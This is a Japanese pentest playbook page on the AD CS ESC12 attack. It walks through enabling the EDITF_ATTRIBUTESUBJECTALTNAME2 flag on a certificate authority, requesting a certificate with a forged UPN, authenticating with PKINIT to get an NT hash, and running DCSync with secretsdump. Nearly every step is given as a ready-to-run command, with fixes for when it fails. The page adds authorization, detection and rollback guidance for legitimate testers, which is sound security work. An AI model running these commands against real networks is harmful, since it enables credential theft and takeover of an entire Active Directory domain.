# ESC12 — EDITF_ATTRIBUTESUBJECTALTNAME2 + CA へのシェルアクセス

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [x] 不可逆な設定変更を含む（`EDITF_ATTRIBUTESUBJECTALTNAME2` の設定変更は CA 全体に影響）
> - [x] 業務停止リスク（`certutil -setreg` によるCAサービス再起動を伴う場合がある）
>
> 実施可否は事前合意で明示確認すること。CA フラグの変更は必ず変更前の値を記録し、テスト完了時に元に戻すこと。
> 演習環境では制約なし。

---

## 着火条件

以下のいずれかの組み合わせで実施する：

### パターン A：CA フラグ設定済みの環境（ESC6 相当を CA シェルから確認）

- CA の `EDITF_ATTRIBUTESUBJECTALTNAME2` フラグが **既に有効**（Certipy で `User Specified SAN: Enabled` として検出される = ESC6 と同義）
- かつ CA サーバーへのローカル管理者またはリモートシェルアクセスがある

### パターン B：CA へのシェルアクセスで新たにフラグを有効化する

- CA サーバーへのローカル管理者またはリモートシェルアクセス（RDP・WinRM・psexec 経由など）がある
- `EDITF_ATTRIBUTESUBJECTALTNAME2` フラグが **現時点では無効**だが攻撃者が設定できる
- 設定後は任意のテンプレートで SAN を自由指定した証明書が発行できる（ESC6 と同じ結果）

**攻撃者の思考トレース：** `EDITF_ATTRIBUTESUBJECTALTNAME2` は CA レベルで SAN の自由指定を許可するフラグ。ESC6 はこのフラグが既存設定で有効な脆弱性。ESC12 は CA マシンへのシェルアクセスを利用してフラグを設定・利用するパターンを指す。CA サーバー自体の侵害は「AD CS の再設定」「証明書データベースへの直接アクセス」など ESC6 以上の影響を持つため、特に影響範囲が広い。

> **注意（ESC12 の情報は少なく PoC が限られる）：** ESC12 は「CA マシンへのシェルアクセスがある前提」であるため、シェル取得経路（CA サーバーの別の脆弱性・平文認証情報）の確立が先決。CA サーバーへのアクセス方法は AD CS とは独立した侵害経路。

---

## 環境前提

- **実行環境**: CA サーバー上（ローカル管理者権限またはドメイン管理者権限）
- **必要なツール**:
  - `certutil`（Windows 標準搭載。CA サーバー上または Certipy から RPC 経由）
  - Certipy（テスター端末側。証明書申請・認証フェーズで使用）
- **必要な権限**:
  - CA サーバーへのローカル管理者権限（または CA Admins グループ所属）
  - Enrollment 権限を持つドメインユーザーアカウント
- **オフライン代替**: CA サーバー上でのみ操作可能。テスター端末からのリモート設定変更には `certutil -config [CA_SERVER]\[CA_NAME] -setreg` 形式を使う（CA への接続可能な端末要）

---

## 観点・着眼点

### 先に確認すること

```bash
# [Attacker] CA フラグの現在値を確認（テスター端末から Certipy で）
certipy find \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -stdout
# 出力の "User Specified SAN" フィールドを確認:
# Enabled  → EDITF_ATTRIBUTESUBJECTALTNAME2 が有効（ESC6 相当、パターン A）
# Disabled → CA サーバーへのシェルアクセスで設定が必要（パターン B）
```

CA サーバー上での直接確認：

```powershell
# [Target / CA Server] CA フラグを直接確認
certutil -getreg policy\EditFlags
# 出力に "EDITF_ATTRIBUTESUBJECTALTNAME2 -- 0x40000 (262144)" が含まれれば有効
```

### 何が出たら次に何をするか

| シグナル | 判断 |
|---------|------|
| `User Specified SAN: Enabled`（Certipy 出力） | ESC6 と同じ手順で即利用可能 → `ESC6.md` |
| CA サーバーに管理者シェルがある + フラグ無効 | パターン B の手順でフラグ設定後に ESC6 手順を適用 |
| CA サーバーへのアクセスが確立できない | ESC12 は使えない。ESC1〜ESC8 の経路を再確認する |

---

## 手順

### パターン A：フラグ設定済み（ESC6 と同一手順）

`EDITF_ATTRIBUTESUBJECTALTNAME2` が既に有効な場合は ESC6 の手順を参照：

> → `ESC6.md` を参照（手順は完全に同一）

### パターン B：CA シェルからフラグを有効化する

事前準備（必須）：変更前のフラグ値を記録する

```powershell
# [Target / CA Server] 現在のフラグ値を記録（原状回復のため必須）
certutil -getreg policy\EditFlags
# 出力例: EditFlags REG_DWORD = 0x11014e (1114446)
# この値をメモしておく
```

#### Step 1: フラグを有効化する

```powershell
# [Target / CA Server] EDITF_ATTRIBUTESUBJECTALTNAME2 フラグを追加
certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
# CA サービスの再起動が必要
net stop certsvc && net start certsvc
```

リモートから Certipy で設定変更する場合（ManageCA 権限が必要）：

```bash
# [Attacker] Certipy の CA 管理コマンドで有効化
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -enable-editf
# → これは ESC7 の ManageCA 権限が必要
```

#### Step 2: 任意のテンプレートで UPN を指定して証明書を申請する

事前準備（必須）：時刻同期

```bash
# [Attacker] DC との時刻同期
sudo ntpdate -u [DC_IP]
```

```bash
# [Attacker] Client Authentication EKU を持つ任意のテンプレートで申請
# フラグ有効化後は Enrollee Supplies Subject が False のテンプレートでも UPN 指定が通る
certipy req \
  -ca [CA_NAME] \
  -template [TEMPLATE_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -upn [TARGET_UPN]
# → [TARGET_USERNAME].pfx が生成される
```

#### Step 3: 証明書で PKINIT 認証 → NT ハッシュ取得

```bash
# [Attacker] PKINIT 認証
certipy auth \
  -pfx [TARGET_USERNAME].pfx \
  -dc-ip [DC_IP]
```

#### Step 4: NT ハッシュで DCSync

```bash
# [Attacker] DCSync
impacket-secretsdump \
  -just-dc-ntlm \
  -no-pass \
  -hashes :[NT_HASH] \
  [DOMAIN]/[TARGET_USERNAME]@[DC_IP]
```

### 原状回復（パターン B のフラグを戻す）

```powershell
# [Target / CA Server] フラグを元の値に戻す（記録していた値を使う）
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

証明書の失効：

```bash
# [Attacker] 発行した証明書を失効
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -revoke [REQUEST_ID]
```

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| CA サーバーへのシェルアクセスが得られない | ESC12 は使えない。CA サーバーへの別の侵害経路（AD の脆弱性・SMB・WinRM）を探す |
| `certutil -setreg` に `ACCESS_DENIED` | ローカル管理者権限が必要。DA 権限がある場合は `psexec` 経由でローカル SYSTEM として実行する |
| フラグ有効化後も `certipy req` に `-upn` オプションが効かない | CA サービスの再起動を実施しているか確認（`net stop certsvc && net start certsvc`） |
| `certipy auth` が失敗する | ESC6 の「刺さらなかったとき」と同様の対処 → `ESC6.md` 参照 |

---

## 注意点・落とし穴

- **CA サービスの再起動は業務影響あり**：`net stop certsvc` は CA 証明書サービスを停止する。停止中は証明書の発行・失効・確認ができなくなる。本番では再起動タイミングの調整が必須
- **CA サーバーは通常 Tier 0 資産**：CA サーバーへの侵害は AD フォレスト全体への影響を持つ。本番では特に慎重に扱い、操作ログを詳細に記録する
- **変更前のフラグ値は必ず記録する**：`certutil -getreg policy\EditFlags` の出力値を記録せずに変更すると原状回復が困難になる
- **ESC6 との関係**：ESC12 パターン A は ESC6 の条件と完全に一致する。ESC12 は「どうやってフラグが設定された（または設定できる）か」の経路が CA シェルアクセスによるという点で区別する

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。CA サーバーへの直接アクセスとフラグ変更は最高影響度の操作
- **想定されるSIEM/EDR検知**: CA サービス停止・再起動ログ / Event ID 4886・4887 / `certutil` 実行ログ / MDI「AD CS 設定変更」アラート
- **業務影響リスク**: CA サービス再起動中（数秒〜数分）は証明書サービスが一時停止する。スマートカード認証やオートエンロールメントを使う環境では影響が大きい
- **原状回復必須項目**: ✅ `EDITF_ATTRIBUTESUBJECTALTNAME2` フラグを元の値に戻す / ✅ CA サービス再起動で設定を反映 / ✅ 発行した証明書を CA で失効 / ✅ 取得した NT ハッシュ・TGT・pfx ファイルの暗号化保管・テスト完了時破棄
- **取得情報の取扱**: pfx ファイル・NT ハッシュ・TGT は暗号化保管、テスト完了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `./Overview.md`
- 前：ESC6（同一フラグを設定済みの状態から悪用） → `./ESC6.md`
- 前：ESC7（ManageCA 権限でのリモートフラグ変更） → `./ESC7.md`
- 後：証明書取得後の DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
